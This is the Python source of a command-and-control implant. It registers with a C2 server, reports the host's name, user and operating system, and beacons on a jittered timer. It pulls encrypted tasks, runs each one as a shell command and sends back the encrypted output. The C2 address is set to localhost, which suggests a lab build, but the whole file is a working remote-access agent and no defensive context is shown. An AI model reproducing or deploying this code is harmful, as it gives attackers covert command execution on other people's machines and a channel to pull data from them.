import os
import time
import uuid
import json
import socket
import random
import platform
import subprocess
import requests
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

C2_URL = "http://127.0.0.1:5000"
UID_FILE = ".agent_id"


def encrypt(key_b64, plaintext: bytes) -> str:
    key = base64.b64decode(key_b64)
    aes = AESGCM(key)
    nonce = os.urandom(12)
    return base64.b64encode(nonce + aes.encrypt(nonce, plaintext, None)).decode()


def decrypt(key_b64, token_b64: str) -> bytes:
    key = base64.b64decode(key_b64)
    blob = base64.b64decode(token_b64)
    nonce, ct = blob[:12], blob[12:]
    return AESGCM(key).decrypt(nonce, ct, None)


def load_or_create_uid():
    if os.path.exists(UID_FILE):
        return open(UID_FILE).read().strip()
    uid = uuid.uuid4().hex
    open(UID_FILE, "w").write(uid)
    return uid


def gather_info():
    return {
        "hostname": socket.gethostname(),
        "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
        "os": f"{platform.system()} {platform.release()}",
    }


def register(uid):
    info = gather_info()
    info["uid"] = uid
    r = requests.post(f"{C2_URL}/api/register", json=info, timeout=10)
    r.raise_for_status()
    return r.json()


def run_command(cmd: str) -> str:
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=30
        )
        return (result.stdout or "") + (result.stderr or "")
    except Exception as e:
        return f"[!] execution error: {e}"


def main():
    uid = load_or_create_uid()
    try:
        cfg = register(uid)
    except Exception as e:
        print(f"[!] registration failed: {e}")
        return

    key = cfg["key"]
    sleep = cfg.get("sleep", 5)
    jitter = cfg.get("jitter", 0.2)
    print(f"[+] registered as {uid}")

    while True:
        try:
            r = requests.post(f"{C2_URL}/api/beacon/{uid}", timeout=10)
            tasks = json.loads(decrypt(key, r.json()["data"]))
            for t in tasks:
                out = run_command(t["command"])
                payload = encrypt(key, json.dumps({"id": t["id"], "output": out}).encode())
                requests.post(f"{C2_URL}/api/result/{uid}", json={"data": payload}, timeout=10)
        except Exception as e:
            print(f"[!] beacon error: {e}")

        delay = sleep * (1 + random.uniform(-jitter, jitter))
        time.sleep(max(1, delay))


if __name__ == "__main__":
    main()
